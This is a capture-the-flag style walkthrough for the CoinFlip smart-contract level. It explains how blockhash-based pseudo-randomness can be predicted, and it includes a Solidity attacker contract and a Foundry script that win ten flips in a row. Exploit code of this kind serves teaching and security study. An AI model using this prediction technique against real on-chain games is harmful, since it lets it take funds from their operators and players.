
Everything in the EVM is deterministic. This means that entropy doesn't exist natively on-chain (you can use third-party solutions like Chainlink VRF). The logic used in the CoinFlip contract is only pseudo-random. So we can predict the next flip by using the same logic as the one in the contract. Once done, we can call the flip function with the predicted value and repeat this 10 times to win the level.

We can craft a smart contract that reproduces the same logic as the CoinFlip contract to predict the next flip and call the flip function with the predicted value.

# Guidance:
- Instead of blindly guessing, you need to replicate the logic from CoinFlip in your contract.

- Get the blockhash(block.number - 1), perform the same calculation, and use that to determine whether to guess true or false.

- Your contract should call flip() with the correct prediction.

# Next Steps:
- Modify your guessOutcome() function to compute the expected result using the same formula as CoinFlip.

- Ensure your contract is calling the flip() function in the same block to stay in sync with the original contract's computation.

``` js 
contract Guess {
    CoinFlip coinFlipContract;
    uint256 public coinFlipContractconsecutiveWins;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip){
        coinFlipContract = _coinFlip; 
    }

    function guessOutcome() public returns(bool){

        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return coinFlipContract.flip(side);
    }

}
```

To have consecutive 10 wins use this script

```js
    function run() public {
        vm.startBroadcast(player);  // Use `player` for all transactions

        uint256 consecutiveWins = coinFlip.consecutiveWins();

        while (consecutiveWins < 10) {
            guess.guessOutcome();
            consecutiveWins = coinFlip.consecutiveWins();
            console2.log("Consecutive Wins:", consecutiveWins);
        }

        vm.stopBroadcast();

        console2.log("Successfully guessed 10 times in a row!");
    }

```


test_Flip_Guess() function:
- Check if the guess is correct using assertEq()
- Repeat the test for 10 wins in a row
- Log results using console.log() for debugging